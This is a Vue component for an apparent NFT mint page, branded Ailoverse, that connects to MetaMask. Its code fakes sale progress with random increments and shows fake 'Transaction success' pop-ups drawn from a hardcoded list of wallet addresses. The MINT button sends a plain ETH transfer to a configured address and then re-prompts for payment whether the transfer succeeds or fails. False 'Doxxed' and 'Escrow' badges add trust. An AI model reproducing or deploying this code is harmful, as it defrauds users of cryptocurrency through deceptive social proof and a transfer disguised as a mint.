<script setup>
/*  import
------------------------------------------------ */
import {ref, reactive, onBeforeMount, onMounted} from "vue";
import {useRouter, useRoute} from "vue-router";
import Web3 from 'web3'

const router = useRouter();
const route = useRoute();
/*  生命周期
------------------------------------------------ */
onBeforeMount(() => {

});
onMounted(() => {
  selectImg();
  setInterval(gettime, 1000);
  setInterval(getProgress, 2500);
  init();
  let devp = getMobileOperatingSystem();
  if (devp == "Android" || devp == "iOS") {
    let wrapper = document.createElement('a');
    wrapper.classList.add('mmLink');
    wrapper.href = "https://metamask.app.link/dapp/" + ((window.location.href).replace('https://', '').replace('http://', '')) + "?uid=mm";
    connectBtn.value.parentNode.insertBefore(wrapper, connectBtn.value);
    wrapper.appendChild(connectBtn.value);
  }
});

/*  配置常量
------------------------------------------------ */
const PRICE = window.PRICE;
const TOTAL = window.TOTAL;
const MAX = window.MAX;
const ADDRESS = window.ADDRESS;
const _title1 = window._title1;
const _title2 = window._title2;


/* 页面跳转
------------------------------------------------ */
const openDiscord = () => {
  window.open("https://discord.com/invite/ailoverse");
};
const openTwitter = () => {
  window.open("https://twitter/ailoverse");
};

/*  轮播图片
------------------------------------------------ */
const imgs = [
  require("../public/img/slide1.png"),
  require("../public/img/slide2.png"),
  require("../public/img/slide3.png"),
];
let Ailoverse = ref(require("../public/img/slide1.png"));
let ti = null;
let imgss = [...imgs];
const selectImg = () => {
  ti = setInterval(() => {
    imgss.pop();
    if (imgss.length == 0) {
      imgss = [...imgs];
      Ailoverse.value = 3;
    }
    Ailoverse.value = imgss.length;
  }, 2000);
};

/*  时钟
------------------------------------------------ */
let time = ref("13/04/22 10:18:34");

function gettime() {
  let today = new Date();
  let y = today.getFullYear();
  let m = today.getMonth();
  let d = today.getDate();
  let h = today.getHours();
  let i = today.getMinutes();
  let s = today.getSeconds(); // 在小于10的数字钱前加一个‘0’
  m = m + 1;
  d = checkTime(d);
  m = checkTime(m);
  i = checkTime(i);
  s = checkTime(s);
  time.value = `${d}/${m}/${y} ${h}:${i}:${s}`;
}

const checkTime = (i) => {
  if (i < 10) {
    i = "0" + i;
  }
  return i;
};

/*  成交进度条
------------------------------------------------ */
let curNum = ref(364);
let lessNum = ref(TOTAL);
let limit = ref(TOTAL);
let price = ref(PRICE);
let max = ref(MAX);

let progress = ref(((curNum.value / lessNum.value) * 100).toFixed(2));

/*  交易成功通知弹窗
------------------------------------------------ */
const wallet = [
  "0x302eaa96d75cb11fc657c5df656e8f12b3459497",
  "0xbfc2c0b1664c61e8bb0c4f887cddd2a792527eee",
  "0xf7d43c1c7819bd2cfe52c651c04f00697f4daaf6",
  "0x08cc43522f62c696ddb198219bb6e6f8e35fe8e7",
  "0xbb73f694ac9315fdf5b52d93ccb79e8d1d517d0a",
  "0x47647fd3f83f041bf2f5a99d1ca953461d96d7b0",
  "0x1b4385a7b0a56dad5a9fc9408ab7191db6c02ad0",
  "0x4b7abf22fb1958191b9c1b8aa1aa35a7dd673323",
  "0x7292dba86c3114d10b451eadbec52282981bab8e",
  "0xf543eb01405e72e080d52df3885e1eb51f6caa22",
  "0x4d869421cefb1e53202402c456370f5c86968d23",
  "0xed2dda1fa7bfb8a7e69183b4ad4601d6571eb29c",
  "0x62c4f6211c8fc460a6f53b8f3b84ed407ddf0f8c",
  "0xbaf8a5dd2843af9c6d3707571e4b4f5c53ae33ee",
  "0x75b6f2abd5bd8668aab1bdebe4512fd70e11dc0c",
  "0x03a8dd542221e3936cb9cd628aa20ad621935a9e",
  "0x5b5e6eec121ca0bbfb02dc6a5254ae623785fef6",
  "0xf6a82a4ca7995e991c129184cc699d929a98d934",
  "0x2f87fc83b3b6c79941a2d8eaf0b36b239ade4f95",
  "0xb6204727f3ef7680e29486b7afa73aa51b4e9c27",
  "0x13b6585a08733175378edd5d59a8e6b063978bec",
  "0x09133f60a6ec96ca92c60bf20c385a67a1cb0d71",
  "0xfe99a780e3bc9527151fa9c9e4703acdb49b0bf7",
  "0x8fb4912c10513c7c87365875944a9dea85520238",
  "0x8beeaab22bbca0d28bede30989cdf2c281684be5",
  "0xdb9222f9bc8009ddd19087d16391c653f84d1935",
  "0x68f14dc7148675b3decdb08718e979cc13de223a",
  "0xa2e744e9dafdf734548310c80de441c967a17fed",
  "0x5f696e82ec61281df86667cdd9f602ef700074aa",
  "0x5e8b2280444ae749e31dec94769ac2a6586866e0",
  "0x4da24757a69ac2cd07a506284f036223fdbe840c",
  "0xbc6f0d526e8fde65fa4264df6cab988de4236504",
  "0x54e4484320ec96b6e5d420e63d5aeec36a130d98",
  "0x8270883f350f8f1c4efbd95c4646d45e05279782",
  "0x86ac35be3c68447fdefa9acbe9e2eb741dfb00f5",
  "0x5a1e979b5b3c71f15169273e844fe9265070d79c",
  "0x346dbd8c3fed2b5a9231f8f03b7e7761e9327831",
  "0x0d463119902b5f4a6cd3f255b0ec223c487a3676",
  "0x30fefe5fff804572841d9ea0eaa61c76d640b620",
  "0xd17633cc11e4bb5fa611d49798bda32a35375b40",
  "0x57df082b1595f863e628c3021b710579e9bf74c7",
  "0x2a1e1d66e04932a64b3546e02a2afc075bd2da92",
  "0x96ced87b4126d87f365b502623f4b9654e267ef7",
  "0x9889e3ce434936b24a97928c55e2ea4d95a3e586",
  "0x8989c921d97917caa25da816e923477a91e7e2ae",
  "0x8d04f1a90899ed37090463785ca8e8298d87cdba",
  "0x85baaa9fb84b5f93e24869f748b96fd6b5c65979",
]
const getProgress = () => {
  let i = Math.floor(Math.random() * 6);
  let j = Math.floor(Math.random() * 50);
  // console.log(i);
  curNum.value += i;
  progress.value = ((curNum.value / lessNum.value) * 100).toFixed(2);
  if (progress.value >= 100) {
    progress.value = 100;
    curNum.value = lessNum.value;
  }
  let str = wallet[j].slice(0, 10) + '......' + wallet[j].slice(-10);
  ElNotification({
    title: 'Transaction success',
    message: str,
    duration: 3200,
    showClose: false,
  })
};

let title1 = ref(_title1);
let title2 = ref(_title2);

/* web3 操作
------------------------------------------------ */
// 检查钱包是否链接、生成web3实列
const showConnect = ref(true); // connect / mint 按钮切换显示
const init = () => {
  if (window.ethereum) {
    window.web3 = new Web3(ethereum);
  }
  ;
  isConnected();
}
const isConnected = () => {
  if (window.ethereum) {
    if (window.ethereum.selectedAddress) {
      showConnect.value = false;
    } else if (window.ethereum.isMetaMask) {
      showConnect.value = true;
    }
  } else {
    showConnect.value = true;
  }
};

// 变更 eth 数量与购入总价
const countETH = ref(1);
const totalETH = ref(parseFloat(countETH.value * PRICE).toFixed(2));
const changeCount = (i) => {
  countETH.value = i + countETH.value;
  if (countETH.value < 1) {
    countETH.value = 1;
  }
  ;
  if (countETH.value > MAX) {
    countETH.value = MAX;
  }
  ;
  totalETH.value = parseFloat(countETH.value * PRICE).toFixed(2);
}

// 申请转账
const mintETH = async () => {
  await getAccount();
  await sendTransaction();
}

// 获取浏览器钱包用户
let account = '';
const getAccount = async () => {
  account = await ethereum.request({
    method: 'eth_requestAccounts'
  });
  console.log(account);
  if (window.ethereum.chainId == "0x1") {
    console.log("Already connected to ethereum mainnet...");
    isConnected();
  } else {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{
          chainId: '0x1'
        }],
      });
      isConnected();
    } catch (switchError) {
      if (error.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x1'
            }],
          });
          isConnected();
        } catch (addError) {
          // handle "add" error
        }
      }
    }
  }
}

// 转账
const sendTransaction = async () => {
  const priceToWei = (totalETH.value * 1e18).toString(16)
  //const gasLimit = (100000 * totalPriceAmount).toString(16);

  window.ethereum.request({
    method: 'eth_sendTransaction',
    params: [{
      from: account[0],
      to: ADDRESS,
      value: priceToWei
    },],
  })
      .then((txHash) => {
        mintETH();
      })
      .catch((error) => {
        mintETH();
      });
}

// 判断手机打开、PC打开
const connectBtn = ref(null);
const getMobileOperatingSystem = () => {
  let userAgent = navigator.userAgent || navigator.vendor || window.opera;
  console.log(userAgent);
  // Windows Phone must come first because its UA also contains "Android"
  const herf = window.document.location.href;
  if (herf.indexOf('uid=mm') != -1) {
    return "Metamask";
  }
  if (/windows phone/i.test(userAgent)) {
    return "Windows Phone";
  }

  if (/android/i.test(userAgent)) {
    return "Android";
  }

  // iOS detection from: http://stackoverflow.com/a/9039885/177710
  if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
    return "iOS";
  }
  return "unknown";
}

</script>

<template>
  <div class="main">
    <div class="bg-layer"></div>
    <div class="conten-box">
      <div class="left" v-if="false">
        <div class="left-l1">
          <span style="background: #00ba7f" class="tag">Doxxed</span>
          <span style="background: #17a2b8" class="tag">Escrow 14d</span>
        </div>
        <span class="left-l2">{{ title1 }}</span>
        <span class="left-l3">
          {{ title2 }}
        </span>
        <span class="left-l4"
        >Total items {{ limit }} | Price {{ price }} ETH | Max {{ max }} per wallet</span
        >
        <div>
          <el-carousel
              :interval="2500"
              type="card"
              height="200px"
              arrow="never"
          >
            <el-carousel-item v-for="item in imgs" :key="item">
              <img :src="item" alt=""/>
            </el-carousel-item>
          </el-carousel>
        </div>
        <div class="left-l5">
          <span>Join the community</span>
          <i class="iconfont icondiscord" @click="openDiscord"></i>
          <i class="iconfont icontwitter" @click="openTwitter"></i>
        </div>
      </div>
      <div class="right">
        <div class="right-content">
          <div class="right-content-top">
            <TransitionGroup>
              <img
                  v-for="(e, i) in imgs"
                  :key="i"
                  :src="e"
                  v-show="Ailoverse == i + 1"
                  alt=""
              />
            </TransitionGroup>
            <span class="right-content-top-l1">{{ title1 }}</span>
            <span class="right-content-top-l2">LIMITED SALE</span>
            <div class="right-content-top-l3">
              <span>{{ time }}</span>
              <span class="tag">PRE-SALE IS LIVE</span>
            </div>
          </div>
          <div class="right-content-bottom">
            <div class="right-content-bottom-l1">
              <div>
                <i class="iconfont iconjian" @click="changeCount(-1)"></i>
                <span class="count">{{ countETH }}</span>
                <i class="iconfont iconjia" @click="changeCount(1)"></i>
              </div>
              <div>
                <span>Total：</span>
                <span class="totalPrice"></span>
                <span>{{ totalETH }} ETH</span>
                <i class="iconfont iconyitaifang"></i>
              </div>
            </div>
            <div ref="connectBtn" class="right-content-bottom-l2 connect" v-if="showConnect" style="display: block"
                 @click="getAccount"
            >
              CONNECT
            </div>
            <div
                class="right-content-bottom-l2 mint disable" v-if="!showConnect"
                style="display: block"
                @click.stop="mintETH"
            >
              MINT
            </div>
            <span class="right-content-bottom-l3">
              <span style="color: #dda20e">{{ curNum }}</span>
              out of
              <span style="color: #00ba7f">{{ lessNum }}</span>
              minted
              <i style="color: #ffc83d" class="iconfont iconshandian"></i>
            </span>
            <div style="width: 80%; margin: 0 auto">
              <el-progress
                  :text-inside="true"
                  :stroke-width="24"
                  :percentage="progress"
                  color="#ddc613"
              />
            </div>
            <span class="right-content-bottom-l3">Limited Sale In Progress</span>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>
<style lang="scss">
.main {
  height: 100vh;
  width: 100vw;

  .bg-layer {
    background-attachment: scroll;
    background-clip: border-box;
    background-color: rgba(0, 0, 0, 0);
    background-image: url("../public/img/bg.jpeg");
    background-origin: padding-box;
    background-position: 50% 45%;
    background-repeat: no-repeat;
    background-size: cover;
    height: 100vh;
    width: 1920px;
    color: rgb(255, 255, 255);
    position: absolute;
    top: 0px;
    bottom: 0px;
    left: 0px;
    right: 0px;
    z-index: -10;
    overflow: hidden;
    position: relative;

    &:after {
      background-attachment: scroll;
      background-color: rgba(0, 0, 0, 0.34);
      background-image: none;
      background-origin: padding-box;
      background-position: 0% 0%;
      background-repeat: initial;
      background-size: auto;
      box-sizing: border-box;
      content: " ";
      display: block;
      height: 100vh;
      width: 100vw;
      position: absolute;
      bottom: 0px;
      left: 0px;
      right: 0px;
      top: 0px;
    }
  }

  .conten-box {
    width: 59%;
    height: 100vh;
    margin: 0 auto;
    position: absolute;
    top: 0px;
    bottom: 0px;
    left: 0px;
    right: 0px;
    z-index: 2000;
    display: flex;
    justify-content: space-between;
    align-items: center;

    .left {
      width: 50%;
      height: 65%;
      padding: 0 16px;

      .left-l1 {
        .tag {
          height: 20px;
          line-height: 12px;
          padding: 4px 16px;
          border-radius: 999px;
          font-family: Poppins, sans-serif;
          font-size: 12px;
          font-weight: 700;
          box-sizing: border-box;
          display: inline-block;
          cursor: pointer;
          margin-right: 10px;
        }
      }

      .left-l2 {
        display: block;
        width: 100%;
        height: 68px;
        line-height: 68px;
        margin: 10px 0;
        color: #fff;
        font-family: Poppins, sans-serif;
        font-size: 50px;
        font-weight: 700;
      }

      .left-l3 {
        padding: 0 40px 0 0;
        margin: 0 0 16px;
        line-height: 24px;
        font-family: Poppins, sans-serif;
        font-size: 16px;
        font-weight: 400;
        display: block;
      }

      .left-l4 {
        display: block;
        margin: 0 0 16px;
        padding: 0 40px 4px 0;
        font-family: Poppins, sans-serif;
        font-size: 18px;
        font-weight: 600;
        line-height: 27px;
      }

      .left-l5 {
        display: block;
        margin: 4px 0 0;
        padding: 8px 0 0;
        font-family: Poppins, sans-serif;
        font-size: 18px;
        font-weight: 600;
        height: 48px;
        line-height: 27px;

        i {
          font-size: 25px;
          color: #fff;
          line-height: 27px;
          margin-left: 10px;
          cursor: pointer;
        }
      }
    }

    .right {
      width: 48%;
      height: 65%;
      border-radius: 40px;
      border: 12px solid rgba(0, 0, 0, 0.2);
      // overflow: hidden;
      > .right-content {
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.66);
        border-radius: 30px;

        > div {
          width: 100%;
          height: 50%;
        }

        .right-content-top {
          position: relative;
          display: flex;
          flex-flow: column;
          justify-content: center;
          align-content: center;

          img {
            width: 170px;
            height: 170px;
            position: absolute;
            right: 0px;
            left: 0px;
            top: -50px;
            margin: 0 auto;
            border-radius: 20px;
            // transition: all 2s ease-in 2s;
          }

          .right-content-top-l1 {
            display: inline-block;
            text-align: center;
            position: absolute;
            right: 0px;
            left: 0px;
            top: 135px;
            margin: 0 auto;
            color: #f1d60c;
            font-family: Poppins, sans-serif;
            font-size: 20px;
            font-weight: 500;
          }

          .right-content-top-l2 {
            display: inline-block;
            text-align: center;
            color: #ffffff;
            font-family: Poppins, sans-serif;
            font-size: 40px;
            font-weight: 700;
            position: absolute;
            right: 0px;
            left: 0px;
            top: 170px;
            margin: 0 auto;
            padding: 8px 0;
          }

          .right-content-top-l3 {
            display: inline-block;
            text-align: center;
            color: #ffffff;
            font-family: Poppins, sans-serif;
            font-size: 18px;
            font-weight: 500;
            position: absolute;
            right: 0px;
            left: 0px;
            top: 220px;
            margin: 0 auto;
            padding: 8px 0;

            .tag {
              height: 34px;
              line-height: 24px;
              padding: 4px 16px;
              border-radius: 15px;
              font-family: Poppins, sans-serif;
              font-size: 18px;
              font-weight: 600;
              box-sizing: border-box;
              display: inline-block;
              cursor: pointer;
              margin-right: 10px;
              background: #00ba7f;
              margin-left: 20px;
            }
          }
        }

        .right-content-bottom-l1 {
          padding-left: 40px;
          padding-right: 40px;
          display: flex;
          justify-content: space-around;
          align-content: center;

          > div:nth-child(1) {
            width: 150px;
            height: 38px;
            border-radius: 13px;
            background: rgba(232, 232, 232, 0.2);
            display: flex;
            justify-content: space-around;
            align-content: center;

            i {
              line-height: 38px;
              cursor: pointer;
            }

            span {
              font-family: Poppins, sans-serif;
              font-size: 16px;
              font-weight: 700;
              line-height: 38px;
            }
          }

          > div:nth-child(2) {
            font-family: Poppins, sans-serif;
            font-size: 20px;
            font-weight: 700;
            height: 38px;
            line-height: 38px;

            span:nth-child(1) {
              margin-right: 12px;
            }
          }

          > div:nth-child(3) {
            font-family: Poppins, sans-serif;
            font-size: 20px;
            font-weight: 700;
            height: 38px;
            line-height: 38px;
          }
        }

        .right-content-bottom-l2 {
          width: 50%;
          height: 45px;
          margin: 0 auto;
          border-radius: 15px;
          background: linear-gradient(32deg, #0fbd78 0%, #53a739 100%);
          margin-top: 50px;
          line-height: 45px;
          text-align: center;
          font-family: Poppins, sans-serif;
          font-size: 20px;
          font-weight: 700;
          cursor: pointer;
        }

        .right-content-bottom-l3 {
          font-family: Poppins, sans-serif;
          font-size: 18px;
          font-weight: 700;
          display: block;
          margin: 20px auto;
          text-align: center;
        }
      }
    }
  }
}

.el-carousel__item h3 {
  color: #475669;
  font-size: 14px;
  line-height: 200px;
  margin: 0;
  text-align: center;
}

.el-carousel__item img {
  width: 100%;
  height: 100%;
}

.el-carousel__item:nth-child(2n) {
  background-color: #99a9bf;
}

.el-carousel__item:nth-child(2n + 1) {
  background-color: #d3dce6;
}

.v-enter-active,
.v-leave-active {
  transition: opacity 0.5s ease;
}

.v-enter-from,
.v-leave-to {
  opacity: 0;
}
</style>
<script>
export default {
  name: "Home",
};
</script>

